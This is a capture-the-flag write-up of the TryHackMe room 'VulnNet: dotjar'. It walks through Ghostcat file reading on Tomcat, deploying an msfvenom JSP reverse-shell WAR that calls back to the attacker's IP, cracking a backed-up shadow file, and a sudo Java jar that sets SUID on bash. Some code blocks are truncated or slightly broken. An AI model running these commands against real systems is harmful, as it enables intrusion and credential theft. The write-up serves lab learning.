## Machine Information

![dotjar](/assets/images/2021-04-29-17-28-00.png)

VulnNet: dotjar is a medium difficulty room on TryHackMe. An initial scan reveals just two ports, with an outdated version of Apache and AJP running on them. We use the Ghostcat exploit to gain a foothold, and from our reverse shell we find a backup of the password shadow file. We crack a users password then abuse sudo permissions to execute a malicious java program we compile on the server, finally gaining root.

Skills required are basic enumeration and file manipulation. Skills learned are writing and compiling a Java based exploit.

## Initial Recon

As always let's start with Nmap:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/dotjar]
â””â”€# ports=$(nmap -p- --min-rate=1000 -T4 10.10.33.74 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/dotjar]
â””â”€# nmap -p$ports -sC -sV -oA dotjar 10.10.33.74

Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-28 15:26 BST
Nmap scan report for 10.10.33.74
Host is up (0.032s latency).

PORT     STATE SERVICE VERSION
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http    Apache Tomcat 9.0.30

|_http-title: Apache Tomcat/9.0.30

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.16 seconds
```

First let's add the IP to our hosts file:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/jellyfish]
â””â”€# echo 10.10.33.74 dotjar.thm >> /etc/hosts
```

Now let's have a look at the website on port 8080:

![dotjar-default](/assets/images/2021-04-28-15-41-42.png)

We find a basic install of Apache Tomcat on version 9.0.30. We can see [here](http://tomcat.apache.org/oldnews-2019.html) that this is from 2019, and a Google for an exploit finds [this](https://apkash8.medium.com/hunting-and-exploiting-apache-ghostcat-b7446ef83e74). Ghostcat is a well known exploit, and one I've covered before in [this](https://pencer.io/ctf/ctf-thm-tomghost/) room.

Back to this server, and I can't find easy access via the website. Default credentials aren't working for the Manager App and Host Manager areas:

![dotjar-login](/assets/images/2021-04-28-15-46-31.png)

## Ghostcat Exploit

Last time I used ajpshooter, this time I'll turn to searchsploit, so let's see what we've got:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/dotjar]
â””â”€# searchsploit tomcat ajp  
---------------------------------------------------------------- ---------------------------------
 Exploit Title                                                  |  Path
---------------------------------------------------------------- ---------------------------------
Apache Tomcat - AJP 'Ghostcat File Read/Inclusion               | multiple/webapps/48143.py
Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit) | multiple/webapps/49039.rb
---------------------------------------------------------------- ---------------------------------
```

Let's grab the python script:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/dotjar]
â””â”€# searchsploit -m 48143.py
  Exploit: Apache Tomcat - AJP 'Ghostcat File Read/Inclusion
      URL: https://www.exploit-db.com/exploits/48143
     Path: /usr/share/exploitdb/exploits/multiple/webapps/48143.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /root/thm/dotjar/48143.py
```

Reading through the script it looks like we just give it the target server IP or name:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/dotjar]
â””â”€# python 48143.py dotjar.thm
Getting resource at ajp13://dotjar.thm:8009/asdf

The username and password lets us get in to the Host Manager and Server Status areas:

![dotjar-manager](/assets/images/2021-04-28-16-46-34.png)

It doesn't work for the Manager App though, the reason is shown above in the exploit output:

```text
GUI access is disabled for security reasons.
```

## MSFVenom

Now we have credentials to Apache we can upload a Java based reverse shell. Let's create one using msfvenom:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/dotjar]
â””â”€# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.8.165.116 LPORT=1234 -f war -o pencer-shell.war
Payload size: 1083 bytes
Final size of war file: 1083 bytes
Saved as: pencer-shell.war
```

Another Google found [this](https://gist.github.com/pete911/6111816) which shows how to use curl to upload the file. Let's try it:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/dotjar]
â””â”€# curl --upload-file pencer-shell.war -u webdev:'<HIDDEN>' 'http://dotjar.thm:8080/manager/text/deploy?path=/' 
OK - Deployed application at context path [/pencer-shell.war]
```

Now we can trigger the reverse shell, either by browsing to it:

![dotjar-warfile](/assets/images/2021-04-28-17-14-11.png)

Or using curl, for that we need to open the actual .jsp file inside that war:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/dotjar]
â””â”€# jar tf pencer-shell.war 
WEB-INF/
WEB-INF/web.xml
rvptpjsbxcgx.jsp

â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/dotjar]
â””â”€# curl http://dotjar.thm:8080/pencer-shell2.war/rvptpjsbxcgx.jsp
```

Either way, switching to our waiting netcat listeners sees we have a connection:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/dotjar]
â””â”€# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.8.165.116] from (UNKNOWN) [10.10.33.74] 36432
```

## Reverse Shell

First thing as always is upgrade to a better shell:

```text
python3 -c 'import pty;pty.spawn("/bin/bash")'
web@vulnnet-dotjar:/$ ^Z
zsh: suspended  nc -nlvp 1234
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/dotjar]
â””â”€# stty raw -echo; fg
[1]  + continued  nc -nlvp 1234
web@vulnnet-dotjar:/$ stty rows 52 cols 237
```

I had a look around, other than finding another user called jdk-admin there wasn't anything obvious. Time to try LinPEAS and see if we can find anything. Get the latest version and start a web server on Kali so we can get to it:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/dotjar]
â””â”€# wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh

â””â”€# python3 -m http.server 80

```

Now back on the server we can pull the file over and run it:

```text
web@vulnnet-dotjar:/dev/shm$ wget http://10.8.165.116/linpeas.sh
--2021-04-28 22:08:43--  http://10.8.165.116/linpeas.sh

web@vulnnet-dotjar:/dev/shm$ chmod +x linpeas.sh 
web@vulnnet-dotjar:/dev/shm$ ./linpeas.sh
```

It takes a long time to run, but eventually we find something interesting from the output:

```text
[+] Backup files
-rw-r--r-- 1 root root 485 Jan 16 13:44 /var/backups/shadow-backup-alt.gz
```

What is this then?

## John The Ripper

Let's check it out:

```text
web@vulnnet-dotjar:/dev/shm$ file /var/backups/shadow-backup-alt.gz
/var/backups/shadow-backup-alt.gz: gzip compressed data, was "shadow", last modified: Sat Jan 16 12:44:11 2021, from Unix

web@vulnnet-dotjar:/dev/shm$ cp /var/backups/shadow-backup-alt.gz .
web@vulnnet-dotjar:/dev/shm$ gunzip shadow-backup-alt.gz 
web@vulnnet-dotjar:/dev/shm$ file shadow-backup-alt 
shadow-backup-alt: ASCII text

web@vulnnet-dotjar:/dev/shm$ cat shadow-backup-alt 
root:<HIDDEN>:18643:0:99999:7:::
jdk-admin:<HIDDEN>:18643:0:99999:7:::
web:<HIDDEN>:18643:0:99999:7:::
```

We have a copy of the shadow file containing the hashes of the users passwords. We can use unshadow to combine it with the /etc/passwd file:

```text
â”€â”€(rootðŸ’€kali)-[~/thm/dotjar]
â””â”€# unshadow 
Usage: unshadow PASSWORD-FILE SHADOW-FILE

â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/dotjar]
â””â”€# unshadow passwd.txt shadow.txt 
root:<HIDDEN>
jdk-admin:<HIDDEN>:1000:1000:jdk-admin,,,:/home/jdk-admin:/bin/bash
web:<HIDDEN>:1001:1001:,,,:/home/web:/bin/bash
```

We can save these hashes to a file then use JohnTheRipper to try and crack them:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/dotjar]
â””â”€# john hashes.txt --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8

Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

## Privilege Escalation

We find the password for user jdk-admin, let's switch to them and grab the first flag:

```text
web@vulnnet-dotjar:/dev/shm$ su jdk-admin
Password: 

jdk-admin@vulnnet-dotjar:/dev/shm$ cat /home/jdk-admin/user.txt 
THM{<HIDDEN>}
```

One of the first things I check after a getting access to a new user is sudo rights:

```text
jdk-admin@vulnnet-dotjar:/dev/shm$ sudo -l
Matching Defaults entries for jdk-admin on vulnnet-dotjar:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jdk-admin may run the following commands on vulnnet-dotjar:
    (root) /usr/bin/java -jar *.jar
```

## Java Exploit

Excellent, our jdk-user can run any java file as root. A search found a java program that alters the permissions on bash. Nice and simple let's paste it straight in to the server:

```text
jdk-admin@vulnnet-dotjar:/dev/shm$ cat <<EOF >>root.java 
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.IOException;

public class root {
    public static void main(String[] args) {
        String command = "chmod +s /bin/bash";
        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            reader.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
EOF
```

Now we need to compile it:

```text
jdk-admin@vulnnet-dotjar:/dev/shm$ javac root.java
jdk-admin@vulnnet-dotjar:/dev/shm$ jar cfe root.jar root root.class
```

Then we can run our code to change bash permissions:

```text
jdk-admin@vulnnet-dotjar:/dev/shm$ sudo -u root /usr/bin/java -jar root.jar
```

## Root Flag

Finally we run bash and escalate to root to get the last flag:

```text
jdk-admin@vulnnet-dotjar:/dev/shm$ bash -p
bash-4.4# cat /root/root.txt
THM{<HUDDEN>}
```

All done. See you next time.
